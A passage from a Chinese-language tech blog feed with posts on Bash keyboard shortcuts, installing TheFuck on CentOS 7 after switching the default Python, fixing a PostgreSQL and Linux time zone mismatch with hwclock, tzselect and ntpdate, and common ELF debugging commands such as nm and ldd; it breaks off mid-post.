        <content type="html"><![CDATA[<h3 id="编辑命令"><a href="#编辑命令" class="headerlink" title="编辑命令"></a>编辑命令</h3><ul><li>Ctrl + a ：移到命令行首</li><li>Ctrl + e ：移到命令行尾</li><li>Ctrl + f ：按字符前移（右向）</li><li>Ctrl + b ：按字符后移（左向）</li><li>Alt + f ：按单词前移（右向）</li><li>Alt + b ：按单词后移（左向）</li><li>Ctrl + xx：在命令行首和光标之间移动</li><li>Ctrl + u ：从光标处删除至命令行首</li><li>Ctrl + k ：从光标处删除至命令行尾</li><li>Ctrl + w ：从光标处删除至字首</li><li>Alt + d ：从光标处删除至字尾</li><li>Ctrl + d ：删除光标处的字符</li><li>Ctrl + h ：删除光标前的字符</li><li>Ctrl + y ：粘贴至光标后</li><li>Alt + c ：从光标处更改为首字母大写的单词</li><li>Alt + u ：从光标处更改为全部大写的单词</li><li>Alt + l ：从光标处更改为全部小写的单词</li><li>Ctrl + t ：交换光标处和之前的字符</li><li>Alt + t ：交换光标处和之前的单词</li><li>Alt + Backspace：与 Ctrl + w <del>相同</del>类似，分隔符有些差别</li></ul><h3 id="重新执行命令"><a href="#重新执行命令" class="headerlink" title="重新执行命令"></a>重新执行命令</h3><ul><li>Ctrl + r：逆向搜索命令历史</li><li>Ctrl + g：从历史搜索模式退出</li><li>Ctrl + p：历史中的上一条命令</li><li>Ctrl + n：历史中的下一条命令</li><li>Alt + .：使用上一条命令的最后一个参数</li></ul><h3 id="控制命令"><a href="#控制命令" class="headerlink" title="控制命令"></a>控制命令</h3><ul><li>Ctrl + l：清屏</li><li>Ctrl + o：执行当前命令，并选择上一条命令</li><li>Ctrl + s：阻止屏幕输出</li><li>Ctrl + q：允许屏幕输出</li><li>Ctrl + c：终止命令</li><li>Ctrl + z：挂起命令</li></ul><h3 id="Bang-命令"><a href="#Bang-命令" class="headerlink" title="Bang (!) 命令"></a>Bang (!) 命令</h3><ul><li>!!：执行上一条命令</li><li>!blah：执行最近的以 blah 开头的命令，如 !ls</li><li>!blah:p：仅打印输出，而不执行</li><li>!$：上一条命令的最后一个参数，与 Alt + . 相同</li><li>!$:p：打印输出 !$ 的内容</li><li>!*：上一条命令的所有参数</li><li>!<em>:p：打印输出 !</em> 的内容</li><li>^blah：删除上一条命令中的 blah</li><li>^blah^foo：将上一条命令中的 blah 替换为 foo</li><li>^blah^foo^：将上一条命令中所有的 blah 都替换为 foo</li></ul><p><em>友情提示</em>：</p><ol><li>以上介绍的大多数 Bash 快捷键仅当在 emacs 编辑模式时有效，若你将 Bash 配置为 vi 编辑模式，那将遵循 vi 的按键绑定。Bash 默认为 emacs 编辑模式。如果你的 Bash 不在 emacs 编辑模式，可通过 <code>set -o emacs</code> 设置。</li><li>^S、^Q、^C、^Z 是由终端设备处理的，可用 <code>stty</code> 命令设置。</li></ol>]]></content>
      
      
      <categories>
          
          <category> Bash </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Commands </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CentOS 安装TheFuck</title>
      <link href="/2018/12/04/software/CentOS-%E5%AE%89%E8%A3%85TheFuck/"/>
      <url>/2018/12/04/software/CentOS-%E5%AE%89%E8%A3%85TheFuck/</url>
      
        <content type="html"><![CDATA[<p>任务:</p><ul><li>安装TheFuck</li><li>替换yum python</li></ul><p>环境:</p><ul><li>CentOS Linux release 7.6.1810 (Core) </li><li>Python 版本2.7.5</li></ul><p>发现TheFuck需要Python至少 3.4+</p><a id="more"></a><h4 id="首先-升级Python版本。"><a href="#首先-升级Python版本。" class="headerlink" title="首先 升级Python版本。"></a>首先 升级Python版本。</h4><p>以前安装过python3.6, 但是需要将其默认Python 软连接到 Python3.6</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[Postgres@Postgres]python -V</span><br><span class="line">Python <span class="number">2.7</span><span class="number">.5</span></span><br><span class="line">[Postgres@Postgres]sudo mv /usr/bin/python /usr/bin/python2<span class="number">.7</span><span class="number">.5</span></span><br><span class="line">[Postgres@Postgres]sudo ln -s /usr/local/python3/bin/python3  /usr/bin/python</span><br><span class="line">[Postgres@Postgres]python -V</span><br><span class="line">Python <span class="number">3.6</span><span class="number">.4</span></span><br></pre></td></tr></table></figure><p><strong>Python版本已经替换</strong></p><p>当我们替换默认Python版本后，发现yum并不能使用</p><p>修改: <code>/usr/bin/yum</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br></pre></td></tr></table></figure><p>修改为:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7.5</span><br></pre></td></tr></table></figure><p><strong>对应自己版本号即可。</strong></p><p><strong>如果yum命令使用过程中，还发现存在问题，请直接按照上边进行修改即可</strong></p><h4 id="更新python-pip"><a href="#更新python-pip" class="headerlink" title="更新python pip"></a>更新python pip</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> sudo yum -y install epel-release</span><br><span class="line"> sudo yum install python-pip</span><br><span class="line"> sudo pip install --upgrade pip</span><br></pre></td></tr></table></figure><p>替换后报错</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Command <span class="string">"python setup.py egg_info"</span> failed with error code <span class="number">1</span> <span class="keyword">in</span> /tmp/pip-install-Nd5ZPx/pyte/</span><br></pre></td></tr></table></figure><p>解决办法:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install --upgrade setuptools </span><br><span class="line">sudo yum install python-devel</span><br></pre></td></tr></table></figure><h4 id="安装Thefuck"><a href="#安装Thefuck" class="headerlink" title="安装Thefuck"></a>安装<a href="https://github.com/nvbn/thefuck" target="_blank" rel="noopener">Thefuck</a></h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install thefuck</span><br></pre></td></tr></table></figure><p>bash配置:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alias fuck=&apos;eval $(thefuck $(fc -ln -1)); history -r&apos;</span><br></pre></td></tr></table></figure><p>可直接加入<code>.bashrc</code>配置文件中.</p><p>TheFuck 版本升级:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install thefuck --upgrade</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工具篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Commands </tag>
            
            <tag> Software </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pg Time &amp;&amp; Linux 系统时间</title>
      <link href="/2018/11/23/database/Pg-Time-Linux-%E7%B3%BB%E7%BB%9F%E6%97%B6%E9%97%B4/"/>
      <url>/2018/11/23/database/Pg-Time-Linux-%E7%B3%BB%E7%BB%9F%E6%97%B6%E9%97%B4/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Postgresql 进行日志分析时发现,Pg数据库时间存在异常; Postgresql数据库时间与Linux服务器时间不一致</p><p>主要排查:</p><ol><li>postgresql.conf 加载timezone 问题</li><li>进入psql查看show time zone;  select now();</li><li>查看系统date ; hwclock ;</li><li>设置ntp 时间同步</li></ol></blockquote><a id="more"></a><h4 id="“系统时间”-amp-“硬件时间”"><a href="#“系统时间”-amp-“硬件时间”" class="headerlink" title="“系统时间” &amp; “硬件时间”"></a>“系统时间” &amp; “硬件时间”</h4><p>​    系统时间: 一般说来就是我们执行 date 命令看到的时间，linux系统下所有的时间调用（除了直接访问硬件时间的命令）都是使用的这个时间。</p><p>​    硬件时间: 主板上BIOS中的时间，由主板电池供电来维持运行，系统开机时要读取这个时间，并根据它来设定系统时间（注意：系统启动时根据硬件时间设定系统时间的过程可能存在时区换算，这要视具体的系统及相关设置而定）。</p><p>查看系统时间</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">date</span><br></pre></td></tr></table></figure><p>设置系统时间</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">date --set “2012-12-17 10:19"</span><br></pre></td></tr></table></figure><p>查看系统时区:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">date -R</span><br></pre></td></tr></table></figure><p>hwclock命令<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-r, --show         读取并打印硬件时钟（read hardware clock and print result）</span><br><span class="line">-s, --hctosys      将硬件时钟同步到系统时钟（set the system time from the hardware clock）</span><br><span class="line">-w, --systohc     将系统时钟同步到硬件时钟（set the hardware clock to the current system time）</span><br></pre></td></tr></table></figure></p><p><strong>如果使用date命令修改了系统时间，并不会自动去修改硬件时钟，因此，当系统下次重启时，系统时钟还会从硬件时钟去取，date设置的时间就无效了。因此需要hwclock命令再来同步系统时钟到硬件时钟，这样下次启动的时候内核则会读取正确的硬件时间到系统时间。</strong></p><h4 id="查看Linux服务器时区-Date-R"><a href="#查看Linux服务器时区-Date-R" class="headerlink" title="查看Linux服务器时区: Date -R"></a>查看Linux服务器时区: <code>Date -R</code></h4><p>110主库:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[highgo@node2 ~]<span class="comment"># hwclock -r </span></span><br><span class="line">Fri <span class="number">23</span> Nov <span class="number">2018</span> <span class="number">11</span>:<span class="number">21</span>:<span class="number">28</span> AM CST  -<span class="number">0.914369</span> seconds</span><br><span class="line">[highgo@node2 ~]<span class="comment"># date </span></span><br><span class="line">Fri Nov <span class="number">23</span> <span class="number">11</span>:<span class="number">21</span>:<span class="number">53</span> CST <span class="number">2018</span></span><br><span class="line">[highgo@node2 ~]<span class="comment"># date -R </span></span><br><span class="line">Fri, <span class="number">23</span> Nov <span class="number">2018</span> <span class="number">11</span>:<span class="number">21</span>:<span class="number">55</span> +<span class="number">0800</span>  ;; 东八区;</span><br><span class="line">[highgo@node2 ~]<span class="comment"># </span></span><br><span class="line">[highgo@node2 ~]$ </span><br><span class="line">[highgo@node2 ~]$ psql </span><br><span class="line">psql (<span class="number">10.6</span>)</span><br><span class="line">Type <span class="string">"help"</span> <span class="keyword">for</span> help.</span><br><span class="line"></span><br><span class="line">highgo=<span class="comment"># select now();</span></span><br><span class="line">              now              </span><br><span class="line">-------------------------------</span><br><span class="line"> <span class="number">2018</span>-<span class="number">11</span>-<span class="number">23</span> <span class="number">11</span>:<span class="number">22</span>:<span class="number">31.308625</span>+<span class="number">08</span></span><br><span class="line">(<span class="number">1</span> row)</span><br><span class="line"></span><br><span class="line">highgo=<span class="comment"># show time zone;</span></span><br><span class="line"> TimeZone </span><br><span class="line">----------</span><br><span class="line"> PRC</span><br><span class="line">(<span class="number">1</span> row)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[highgo@node2 data]$ grep timezone postgresql.conf </span><br><span class="line">log_timezone = <span class="string">'PRC'</span></span><br><span class="line">timezone = <span class="string">'PRC'</span></span><br><span class="line"><span class="comment">#timezone_abbreviations = 'Default'     # Select the set of available time zone</span></span><br><span class="line"><span class="comment"># share/timezonesets/.</span></span><br></pre></td></tr></table></figure><p>101备库:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[highgo@node1 ~]<span class="comment"># hwclock -r</span></span><br><span class="line">Fri <span class="number">23</span> Nov <span class="number">2018</span> <span class="number">11</span>:<span class="number">23</span>:<span class="number">06</span> AM CST  -<span class="number">0.969391</span> seconds</span><br><span class="line">[highgo@node1 ~]<span class="comment"># date </span></span><br><span class="line">Fri Nov <span class="number">23</span> <span class="number">11</span>:<span class="number">23</span>:<span class="number">46</span> CST <span class="number">2018</span></span><br><span class="line">[highgo@node1 ~]<span class="comment"># date -R</span></span><br><span class="line">Fri, <span class="number">23</span> Nov <span class="number">2018</span> <span class="number">11</span>:<span class="number">23</span>:<span class="number">58</span> +<span class="number">0800</span></span><br><span class="line">[highgo@node1 ~]<span class="comment"># </span></span><br><span class="line">[highgo@node1 ~]$ psql </span><br><span class="line">psql (<span class="number">10.6</span>)</span><br><span class="line">Type <span class="string">"help"</span> <span class="keyword">for</span> help.</span><br><span class="line"></span><br><span class="line">highgo=<span class="comment"># select now();</span></span><br><span class="line">              now              </span><br><span class="line">-------------------------------</span><br><span class="line"> <span class="number">2018</span>-<span class="number">11</span>-<span class="number">23</span> <span class="number">11</span>:<span class="number">25</span>:<span class="number">13.317304</span>+<span class="number">08</span></span><br><span class="line">(<span class="number">1</span> row)</span><br><span class="line"></span><br><span class="line">highgo=<span class="comment"># </span></span><br><span class="line">highgo=<span class="comment"># show time zone;</span></span><br><span class="line"> TimeZone </span><br><span class="line">----------</span><br><span class="line"> PRC</span><br><span class="line">(<span class="number">1</span> row)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[highgo@node1 data]$ grep timezone postgresql.conf </span><br><span class="line">log_timezone = <span class="string">'PRC'</span></span><br><span class="line">timezone = <span class="string">'PRC'</span></span><br><span class="line"><span class="comment">#timezone_abbreviations = 'Default'     # Select the set of available time zone</span></span><br><span class="line"><span class="comment"># share/timezonesets/.</span></span><br></pre></td></tr></table></figure><p>106备库:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[highgo@highgo ~]<span class="comment"># hwclock -r </span></span><br><span class="line">Thu <span class="number">22</span> Nov <span class="number">2018</span> <span class="number">10</span>:<span class="number">24</span>:<span class="number">52</span> PM EST  -<span class="number">0.359908</span> seconds</span><br><span class="line">[highgo@highgo ~]<span class="comment"># </span></span><br><span class="line">[highgo@highgo ~]<span class="comment"># date -R </span></span><br><span class="line">Fri, <span class="number">23</span> Nov <span class="number">2018</span> <span class="number">11</span>:<span class="number">26</span>:<span class="number">04</span> -<span class="number">0500</span>   ;;; 西五区;</span><br><span class="line">[highgo@highgo ~]<span class="comment"># date </span></span><br><span class="line">Fri Nov <span class="number">23</span> <span class="number">11</span>:<span class="number">26</span>:<span class="number">05</span> EST <span class="number">2018</span></span><br><span class="line"></span><br><span class="line">[highgo@highgo ~]$ psql </span><br><span class="line">psql (<span class="number">10.6</span>)</span><br><span class="line">Type <span class="string">"help"</span> <span class="keyword">for</span> help.</span><br><span class="line"></span><br><span class="line">highgo=<span class="comment"># select now();</span></span><br><span class="line">              now              </span><br><span class="line">-------------------------------</span><br><span class="line"> <span class="number">2018</span>-<span class="number">11</span>-<span class="number">24</span> <span class="number">00</span>:<span class="number">26</span>:<span class="number">35.379415</span>+<span class="number">08</span></span><br><span class="line">(<span class="number">1</span> row)</span><br><span class="line"></span><br><span class="line">highgo=<span class="comment"># show time zone;</span></span><br><span class="line"> TimeZone </span><br><span class="line">----------</span><br><span class="line"> PRC</span><br><span class="line"></span><br><span class="line">[highgo@highgo data]$ grep timezone postgresql.conf </span><br><span class="line">log_timezone = <span class="string">'PRC'</span></span><br><span class="line">timezone = <span class="string">'PRC'</span></span><br><span class="line"><span class="comment">#timezone_abbreviations = 'Default'     # Select the set of available time zone</span></span><br><span class="line"><span class="comment"># share/timezonesets/.</span></span><br></pre></td></tr></table></figure><p>猜测与106机器上 时区有关.</p><h4 id="TZSelect-修改时区"><a href="#TZSelect-修改时区" class="headerlink" title="TZSelect 修改时区"></a>TZSelect 修改时区</h4><p><img src="/img/postgresql/tzselect-01.png" alt="tzselect-01"></p><p><img src="/img/postgresql/tzselect-02.png" alt="tzselect-02"></p><p>此时并不会生效, 手动执行</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TZ=<span class="string">'Asia/Shanghai'</span>; export TZ</span><br></pre></td></tr></table></figure><p>查看时区：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[Postgres@Postgres ~]$ date -R </span><br><span class="line">Fri, <span class="number">23</span> Nov <span class="number">2018</span> <span class="number">11</span>:<span class="number">33</span>:<span class="number">48</span> +<span class="number">0800</span></span><br></pre></td></tr></table></figure><p>刷新系统时间到硬件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[Postgres@Postgres ~]<span class="comment"># hwclock -r </span></span><br><span class="line">Thu <span class="number">22</span> Nov <span class="number">2018</span> <span class="number">10</span>:<span class="number">32</span>:<span class="number">39</span> PM EST  -<span class="number">0.656779</span> seconds</span><br><span class="line"></span><br><span class="line">[Postgres@Postgres ~]hwclock -w</span><br><span class="line"></span><br><span class="line">[Postgres@Postgres ~]<span class="comment"># hwclock -r</span></span><br><span class="line">Fri <span class="number">23</span> Nov <span class="number">2018</span> <span class="number">11</span>:<span class="number">34</span>:<span class="number">01</span> AM CST  -<span class="number">0.344289</span> seconds</span><br></pre></td></tr></table></figure><p>数据库重启:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pg_ctl restart</span><br></pre></td></tr></table></figure><p>查看数据库时间:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">highgo=<span class="comment"># select now();</span></span><br><span class="line">              now</span><br><span class="line">-------------------------------</span><br><span class="line"> <span class="number">2018</span>-<span class="number">11</span>-<span class="number">23</span> <span class="number">11</span>:<span class="number">36</span>:<span class="number">55.601811</span>+<span class="number">08</span></span><br><span class="line">(<span class="number">1</span> row)</span><br></pre></td></tr></table></figure><h4 id="ntp-时间同步"><a href="#ntp-时间同步" class="headerlink" title="ntp 时间同步"></a>ntp 时间同步</h4><p>yum -y install ntpdate ntp</p><p>同步在线网络时间。</p><p>　　ntpdate  xxxx</p><p>crontab: 每十分钟调整一次时间</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/<span class="number">10</span> * * * * ntpdate time.nist.gov   <span class="comment">#域名或IP</span></span><br></pre></td></tr></table></figure><p><a href="http://support.ntp.org/bin/view/Servers/StratumOneTimeServers" target="_blank" rel="noopener">一级时间服务器列表</a></p><p><a href="http://support.ntp.org/bin/view/Servers/StratumTwoTimeServers" target="_blank" rel="noopener">二级时间服务器列表</a></p>]]></content>
      
      
      <categories>
          
          <category> Database </category>
          
          <category> Debug </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Postgresql </tag>
            
            <tag> Linux </tag>
            
            <tag> Commands </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux-调试</title>
      <link href="/2018/11/06/rebuild/Linux-%E8%B0%83%E8%AF%95/"/>
      <url>/2018/11/06/rebuild/Linux-%E8%B0%83%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Linux常用命令中有一些命令可以在开发或调试过程中起到很好的帮助作用，有些可以帮助了解或优化我们的程序，有些可以帮我们定位疑难问题。本文将简单介绍一下这些命令。</p><h2 id="示例程序"><a href="#示例程序" class="headerlink" title="示例程序"></a>示例程序</h2><p>我们用一个小程序，来帮助后面我们对这些命令的描述，程序清单cmdTest.c如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a/b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> b = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"a=%d,b=%d\n"</span>,a,b);</span><br><span class="line">    test(a,b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译获得elf文件cmdTest并运行：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -o cmdTest cmdTest.c</span><br><span class="line">./cmdTest</span><br><span class="line">a=<span class="number">10</span>,b=<span class="number">0</span></span><br><span class="line">Floating point exception (core dumped)</span><br></pre></td></tr></table></figure><p>程序内容是在main函数中调用test，计算a/b的值，其中b的值为0，因此程序由于除0错误异常终止。</p><p><br><br><a id="more"></a></p><h2 id="查看文件基本信息–file"><a href="#查看文件基本信息–file" class="headerlink" title="查看文件基本信息–file"></a>查看文件基本信息–file</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file cmdTest</span><br><span class="line">cmdTest: ELF <span class="number">64</span>-bit LSB  executable, x86-<span class="number">64</span>, version <span class="number">1</span> (SYSV), dynamically linked (uses shared libs), <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span>.<span class="number">24</span>, BuildID[sha1]=<span class="number">448</span>e1c34b4c548120e2c04f6a2bfce4e6d2281a3, not stripped</span><br></pre></td></tr></table></figure><p>通过file命令可以看到cmdTest的类型为elf，是64位、运行于x86-64的程序，not striped表明elf文件中还保留着符号信息以及调试信息等不影响程序运行的内容。</p><h2 id="查看程序依赖库–ldd"><a href="#查看程序依赖库–ldd" class="headerlink" title="查看程序依赖库–ldd"></a>查看程序依赖库–ldd</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ldd cmdTest</span><br><span class="line">       linux-vdso.so.<span class="number">1</span> =&gt;  (<span class="number">0</span>x00007ffc8e548000)</span><br><span class="line">       libc.so.<span class="number">6</span> =&gt; /lib/x86_64-linux-gnu/libc.so.<span class="number">6</span> (<span class="number">0</span>x00007f0621931000)</span><br><span class="line">       /lib64/ld-linux-x86-<span class="number">64</span>.so.<span class="number">2</span> (<span class="number">0</span>x00007f0621cf6000)</span><br></pre></td></tr></table></figure><p>我们可以看到cmdTest依赖了libc.so等库。</p><h2 id="查看函数或者全局变量是否存在于elf文件中–nm"><a href="#查看函数或者全局变量是否存在于elf文件中–nm" class="headerlink" title="查看函数或者全局变量是否存在于elf文件中–nm"></a>查看函数或者全局变量是否存在于elf文件中–nm</h2><p>nm命令用于查看elf文件的符号信息。文件编译出来之后，我们可能不知道新增加的函数或者全局变量是否已经成功编译进去。这时候，我们可以使用nm命令来查看。<br>例如，查看前面所提到的elf文件有没有test函数，可以用命令：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nm cmdTest|grep test</span><br><span class="line"><span class="number">000000000040052</span>d T test  <span class="comment">#打印结果</span></span><br></pre></td></tr></table></figure><p>按照地址顺序列出符号信息：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">nm -n cmdTest</span><br><span class="line">                 w _ITM_deregisterTMCloneTable</span><br><span class="line">                 w _ITM_registerTMCloneTable</span><br><span class="line">                 w _Jv_RegisterClasses</span><br><span class="line">                 w __gmon_start__</span><br><span class="line">                 U __libc_start_main@@GLIBC_2.<span class="number">2.5</span></span><br><span class="line">                 U printf@@GLIBC_2.<span class="number">2.5</span></span><br><span class="line"><span class="number">00000000004003</span>e0 T _init</span><br><span class="line"><span class="number">0000000000400440</span> T _start</span><br><span class="line"><span class="number">0000000000400470</span> t deregister_tm_clones</span><br><span class="line"><span class="number">00000000004004</span>a0 t register_tm_clones</span><br><span class="line"><span class="number">00000000004004</span>e0 t __do_global_dtors_aux</span><br><span class="line"><span class="number">0000000000400500</span> t frame_dummy</span><br><span class="line"><span class="number">000000000040052</span>d T test</span><br><span class="line"><span class="number">0000000000400540</span> T main</span><br><span class="line"><span class="number">0000000000400590</span> T __libc_csu_init</span><br><span class="line"><span class="number">0000000000400600</span> T __libc_csu_fini</span><br><span class="line">(列出部分内容)</span><br></pre></td></tr></table></figure><p>可以看到test函数的开始地址为0x000000000040052d，结束地址为0x0000000000400540。</p><h2 id="打印elf文件中的可打印字符串–strings"><a href="#打印elf文件中的可打印字符串–strings" class="headerlink" title="打印elf文件中的可打印字符串–strings"></a>打印elf文件中的可打印字符串–strings</h2><p>例如你在代码中存储了一个版本号信息，那么即使编译成elf文件后，仍然可以通过strings搜索其中的字符串甚至可以搜索某个.c文件是否编译在其中：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings elfFile | grep <span class="string">"someString"</span></span><br></pre></td></tr></table></figure><h2 id="查看文件段大小–size"><a href="#查看文件段大小–size" class="headerlink" title="查看文件段大小–size"></a>查看文件段大小–size</h2><p>可以通过size命令查看各段大小：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">size cmdTest</span><br><span class="line">   text       <span class="keyword">data</span>      bss      dec      hex  filename</span><br><span class="line">   <span class="number">1319</span>      <span class="number">560</span>        <span class="number">8</span>     <span class="number">1887</span>      <span class="number">75</span>f   cmdTest</span><br></pre></td></tr></table></figure><p>text段：正文段字节数大小<br>data段:包含静态变量和已经初始化的全局变量的数据段字节数大小<br>bss段：存放程序中未初始化的全局变量的字节数大小<br>当我们知道各个段的大小之后，如果有减小程序大小的需求，就可以有针对性的对elf文件进行优化处理。</p><h2 id="为elf文件”瘦身“–strip"><a href="#为elf文件”瘦身“–strip" class="headerlink" title="为elf文件”瘦身“–strip"></a>为elf文件”瘦身“–strip</h2><p>strip用于去掉elf文件中所有的符号信息：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span 